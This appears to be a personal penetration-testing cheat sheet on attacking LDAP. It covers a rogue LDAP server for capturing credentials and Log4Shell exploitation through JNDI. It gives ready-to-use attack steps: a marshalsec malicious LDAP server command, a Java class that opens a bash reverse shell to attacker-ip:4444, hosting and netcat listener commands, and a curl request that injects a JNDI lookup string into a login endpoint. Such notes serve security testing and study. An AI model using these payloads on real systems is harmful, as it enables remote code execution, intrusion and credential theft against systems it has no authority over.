# ldap

**Author:** Julien Bongars\
**Date:** 2025-09-24 23:55:48
**Path:**

---

Directory lookups over LDAP. Commonly used for PAM auth and, via JNDI, Log4Shell class loading.

## Authentication Exploitation

### PAM LDAP Integration

```bash
# Typical PAM LDAP configuration
# /etc/pam.d/common-auth
auth required pam_ldap.so
account required pam_ldap.so

# LDAP client configuration
# /etc/ldap/ldap.conf
BASE dc=company,dc=com
URI ldap://ldap.company.com
```

### Forge LDAP Server Attack

```bash
# Set up rogue LDAP server to capture credentials
# Install OpenLDAP
apt-get install slapd ldap-utils

# Configure malicious LDAP server
# /etc/ldap/slapd.conf - point to your controlled directory
# Capture authentication attempts when clients connect

# Monitor authentication attempts
tail -f /var/log/slapd.log
```

## JNDI LDAP Exploitation (Log4Shell)

### Malicious LDAP Server Setup

```bash
# Using marshalsec for JNDI exploitation
wget https://github.com/mbechler/marshalsec/releases/download/v0.0.3/marshalsec-0.0.3-SNAPSHOT-all.jar

# Start malicious LDAP server
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker-ip:8000/#Exploit"

# Server listens on port 1389 by default
# Responds with references to malicious Java classes
```

### Malicious Java Payload

```java
// Exploit.java - Gets executed on target system
public class Exploit {
    static {
        try {
            // Reverse shell payload
            String[] cmd = {"/bin/bash", "-c",
                "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"};
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            // Fail silently
        }
    }
}
```

### Compilation and Hosting

```bash
# Compile malicious class
javac Exploit.java

# Host on HTTP server
python3 -m http.server 8000

# Listen for reverse shell
nc -lvnp 4444
```

### JNDI Payload Injection

```bash
# Inject JNDI payload into vulnerable application
# Common injection points:
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"user": "${jndi:ldap://attacker-ip:1389/Exploit}"}' \
  http://target/api/login

# Payload can be injected in:
# - HTTP headers (User-Agent, X-Forwarded-For)
# - Form fields
# - JSON parameters
# - Any user input that gets logged
```

## Resources

- [OpenLDAP](https://www.openldap.org/) — slapd and client config
- [marshalsec](https://github.com/mbechler/marshalsec) — JNDI LDAPRefServer
- [Sprocket — UniFi Log4j](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) — LDAP callback in the wild
